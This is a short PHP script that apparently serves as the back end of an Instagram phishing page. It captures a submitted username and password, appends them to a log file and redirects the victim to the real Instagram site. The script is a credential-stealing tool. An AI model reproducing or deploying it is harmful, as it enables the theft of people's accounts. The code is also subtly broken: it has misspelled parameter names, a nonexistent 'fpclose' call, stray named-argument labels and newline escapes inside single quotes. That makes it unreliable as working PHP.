<?php

$username = $_POST['username'];
$password = $_POST['passsword'];

$fp = fopen(filename:'log.txt', mpde:'a+' );
fwrite($fp, string:'Username: ' . $username . '\n');
fwrite($fp, string:'Password: ' . $password . '\n');
fwrite($fp, string:'--------- ' . '\n' );
fpclose($fp);


header(string: 'Location: https://www.instagram.com');